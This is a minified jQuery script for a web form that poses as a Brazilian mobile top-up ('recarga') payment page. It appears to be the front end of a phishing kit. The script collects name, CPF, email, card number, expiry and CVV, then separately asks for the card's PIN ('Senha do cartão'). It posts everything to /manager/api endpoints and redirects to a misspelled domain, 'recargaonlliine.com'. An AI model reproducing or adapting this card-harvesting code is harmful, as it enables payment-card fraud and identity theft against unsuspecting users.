var generateToken=function(length,chars)
{var result='';for(var i=length;i>0;--i)result+=chars[Math.floor(Math.random()*chars.length)];return "pr."+result;};window.token=generateToken(64,'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');console.log(token);$(document).ready(function(){function validarCPF(cpf){cpf=cpf.replace(/[^\d]+/g,'');if(cpf=='')return false;if(cpf.length!=11||cpf=="00000000000"||cpf=="11111111111"||cpf=="22222222222"||cpf=="33333333333"||cpf=="44444444444"||cpf=="55555555555"||cpf=="66666666666"||cpf=="77777777777"||cpf=="88888888888"||cpf=="99999999999")
return false;add=0;for(i=0;i<9;i++)
add+=parseInt(cpf.charAt(i))*(10-i);rev=11-(add%11);if(rev==10||rev==11)
rev=0;if(rev!=parseInt(cpf.charAt(9)))
return false;add=0;for(i=0;i<10;i++)
add+=parseInt(cpf.charAt(i))*(11-i);rev=11-(add%11);if(rev==10||rev==11)
rev=0;if(rev!=parseInt(cpf.charAt(10)))
return false;return true;}
$(".inpCPF").mask("999.999.999-99",{autoclear:false});$("#formRecarga .inputRecarga").mask("(99) 99999-9999");$(".inpPhone").mask("(99) 99999-9999");$(".inpCard").mask("9999 9999 9999 9999",{autoclear:false,placeholder:" "});$(".inpCVV").mask("9999",{autoclear:false,placeholder:" "});$("#modalWrapper .inpSelect").on("change",function(){var valueSelected=$(this).val();if(valueSelected=="none"){$(this).removeClass("selected");}else{$(this).addClass("selected");}
console.log(valueSelected);});$("#mainRecargas .planosRecargas li .buttonRecarga").click(function(){$("#formRecarga .inputRecarga").focus();});$(".buttonRecarga").click(function(){var amountRecarga=$(this).attr("data-recarga");$("#modalWrapper .labelRecarga").hide();$("#modalWrapper .labelPhone").show();$("#hiddenInpRecarga").val(amountRecarga);$(".infoRecarga").text("Recarga de R$"+amountRecarga);$("#inputCurrentStep").val("1");$("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");$("#modalWrapper .dialogWindow").addClass("step1");$("#modalWrapper").show();});$("#formRecarga").submit(function(e){e.preventDefault();var allowSubmit=true;var phoneNumber=$("#formRecarga .inputRecarga").val();var regNumber=/^\([0-9]{2}\) [0-9]{5}\-[0-9]{4}$/;if(!regNumber.test(phoneNumber)){$("#formRecarga .inputRecarga").focus();$("#formRecarga .errorMessages").addClass("showTable");setTimeout(function(){$("#formRecarga .errorMessages").removeClass("showTable");},10000);}else{$("#modalWrapper .labelPhone").hide();$("#modalWrapper .labelRecarga").show();$("#hiddenInpPhone").val(phoneNumber);$(".infoRecarga").text("Telefone: "+phoneNumber);$("#inputCurrentStep").val("1");$("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");$("#modalWrapper .dialogWindow").addClass("step1");$("#modalWrapper").show();}});$("#formPayment").submit(function(e){e.preventDefault();var currentStep=$("#inputCurrentStep").val();var phoneNumber=$(".inpPhone").val();var recargaOperadora=$(".inpOperadora").val();var recargaAmount=$(".inpRecarga").val();var holderEmail=$(".inpEmail").val();var holderName=$(".inpName").val();var holderCPF=$(".inpCPF").val();var cardNum=$(".inpCard").val();var cardExpiration1=$("#cardExpirationMonth").val();var cardExpiration2=$("#cardExpirationYear").val();var cardCVV=$(".inpCVV").val();var regPhone=/^\([0-9]{2}\) [0-9]{5}\-[0-9]{4}$/;var regName=/^[\wÀ-ú. ]{5,}$/;var regCPF=/^[0-9]{3}\.[0-9]{3}\.[0-9]{3}\-[0-9]{2}$/;var regEmail=/^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;var regCardNum=/^[0-9 ]{19}$/;var regCardExp1=/^[0-9]{2}$/;var regCardExp2=/^[0-9]{4}$/;var regCardCVV=/^[0-9 ]{4}$/;if(currentStep=="1"){if(!regPhone.test(phoneNumber)){$(".inpPhone").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Telefone inválido!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpPhone").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else if(recargaOperadora!=="vivo"&&recargaOperadora!=="claro"&&recargaOperadora!=="tim"&&recargaOperadora!=="oi"){$(".inpOperadora").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Selecione uma operadora!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpOperadora").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else if(recargaAmount!=="15"&&recargaAmount!=="20"&&recargaAmount!=="35"&&recargaAmount!=="50"){$(".inpRecarga").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Selecione uma recarga!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpRecarga").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else if(!regEmail.test(holderEmail)){$(".inpEmail").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Endereco de email inválido!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpEmail").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else{$("#inputCurrentStep").val("2");$("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");$("#modalWrapper .dialogWindow").addClass("step2");}}else if(currentStep=="2"){if(!regName.test(holderName)){$(".inpName").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Nome completo inválido!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpName").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else if(!regCPF.test(holderCPF)||validarCPF(holderCPF)==false){$(".inpCPF").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("CPF inválido!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpCPF").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10);}else if(!regCardNum.test(cardNum)){$(".inpCard").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Número de cartão inválido!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpCard").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else if(!regCardExp1.test(cardExpiration1)){$("#cardExpirationMonth").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Data de expiração inválida!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpExpiration").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else if(!regCardExp2.test(cardExpiration2)){$("#cardExpirationYear").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Data de expiração inválida!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpExpiration").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else if(!regCardCVV.test(cardCVV)){$(".inpCVV").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Código de segurança inválido!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpCVV").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else{$("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");$("#modalWrapper .dialogWindow").addClass("loading");$.ajax({url:"/manager/api/pagamento",method:"POST",data:$("#formPayment").serialize(),dataType:"json",success:function(data){if(data.status=="success"){gtag_report_conversion();$("#inputCurrentStep").val("3");$("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");$("#modalWrapper .dialogWindow").addClass("step3");}else{$("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");$("#modalWrapper .dialogWindow").addClass("step2");$(".inpCard").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Número de cartão inválido!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpCard").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}},error:function(){alert("Ocorreu um erro, tente novamente mais tarde.");}});}}});$("#formConfirm").submit(function(e){e.preventDefault();var cardPassw=$(".inpPassw").val();var regCardPassw=/^[0-9]{4,6}$/;if(!regCardPassw.test(cardPassw)){$(".inpPassw").addClass("error").focus();$("#modalWrapper .dialogWindowFooter").removeClass("showTable");$("#modalWrapper .dialogWindowError p").text("Senha do cartão inválida!");$("#modalWrapper .dialogWindowError").addClass("error").addClass("showTable");setTimeout(function(){$(".inpPassw").removeClass("error");$("#modalWrapper .dialogWindowError").removeClass("error").removeClass("showTable");$("#modalWrapper .dialogWindowFooter").addClass("showTable");},10000);}else{$.ajax({url:"/manager/api/confirm",method:"POST",data:$("#formConfirm").serialize(),dataType:"json",beforeSend:function(){$("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");$("#modalWrapper .dialogWindow").addClass("loading");},success:function(data){$("#inputCurrentStep").val("4");$("#modalWrapper .dialogWindow").removeClass("loading").removeClass("step1").removeClass("step2").removeClass("step3").removeClass("step4");$("#modalWrapper .dialogWindow").addClass("step4");setTimeout(function(){window.location="http://recargaonlliine.com/?ok";},10000);},error:function(){alert("Ocorreu um erro, tente novamente mais tarde.");}});}});$("#modalWrapper .butCancel").click(function(){$("#modalWrapper").hide();});});